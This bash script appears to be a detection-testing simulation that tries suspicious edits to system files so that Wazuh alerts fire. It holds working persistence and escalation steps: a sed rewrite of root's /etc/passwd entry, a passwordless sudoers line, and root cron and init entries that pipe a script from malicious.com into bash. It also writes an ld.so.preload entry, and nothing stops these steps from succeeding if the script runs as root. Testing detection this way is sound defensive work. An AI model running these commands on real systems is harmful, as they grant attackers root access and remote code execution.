#!/bin/bash

# File Modification Simulation Script for org-4
# This script simulates suspicious file modifications to trigger detection

echo "=== File Modification Simulation for org-4 ==="
echo "Simulating suspicious file modifications..."

# Create a backup directory for files we'll modify
BACKUP_DIR="/tmp/file_mod_backup_$(date +%Y%m%d_%H%M%S)"
mkdir -p $BACKUP_DIR

echo "Created backup directory: $BACKUP_DIR"

# Function to backup and modify a file
backup_and_modify() {
    local file_path=$1
    local modification=$2

    if [ -f "$file_path" ]; then
        echo "Backing up $file_path to $BACKUP_DIR/"
        cp "$file_path" "$BACKUP_DIR/"

        echo "Modifying $file_path: $modification"
        case $modification in
            "append")
                echo "# Suspicious entry added on $(date)" >> "$file_path"
                ;;
            "replace")
                sed -i 's/root:x:0:0/root:x:0:0:attacker/' "$file_path"
                ;;
            "create")
                echo "192.168.1.100 attacker.com" > "$file_path"
                ;;
        esac
    else
        echo "File $file_path does not exist, skipping"
    fi
}

# Attempt to modify /etc/passwd (will likely fail due to permissions)
echo "Attempting to modify /etc/passwd..."
backup_and_modify "/etc/passwd" "replace"

# Attempt to modify /etc/shadow (will likely fail due to permissions)
echo "Attempting to modify /etc/shadow..."
backup_and_modify "/etc/shadow" "append"

# Attempt to modify /etc/sudoers (will likely fail due to permissions)
echo "Attempting to modify /etc/sudoers..."
echo "testuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>&1 || echo "Failed to modify /etc/sudoers (expected)"

# Create a suspicious file in /etc/cron.d/ (will likely fail due to permissions)
echo "Attempting to create a suspicious cron job..."
echo "*/5 * * * * root /bin/bash -c 'curl http://malicious.com/script.sh | bash'" > /tmp/malicious_cron
cp /tmp/malicious_cron /etc/cron.d/malicious_cron 2>&1 || echo "Failed to create cron job (expected)"

# Create a suspicious file in /etc/init.d/ (will likely fail due to permissions)
echo "Attempting to create a malicious init script..."
cat > /tmp/malicious_init << 'EOF'
#!/bin/bash
# Malicious init script
curl http://malicious.com/payload.sh | bash
EOF
chmod +x /tmp/malicious_init
cp /tmp/malicious_init /etc/init.d/malicious_service 2>&1 || echo "Failed to create init script (expected)"

# Create a suspicious file in /etc/ld.so.preload (will likely fail due to permissions)
echo "Attempting to create a malicious preload library..."
echo "/tmp/malicious_lib.so" > /tmp/ld.so.preload
cp /tmp/ld.so.preload /etc/ld.so.preload 2>&1 || echo "Failed to create preload entry (expected)"

echo "File modification simulation complete."
echo "Backup of modified files saved to $BACKUP_DIR"
echo "Check the Wazuh dashboard for alerts (rule ID: 100005)."

# List the backup directory
echo ""
echo "Files backed up:"
ls -la $BACKUP_DIR/

# Show recent syscheck events
echo ""
echo "Recent syscheck events (if available):"
tail -n 20 /var/ossec/logs/ossec.log | grep -i syscheck | tail -n 5
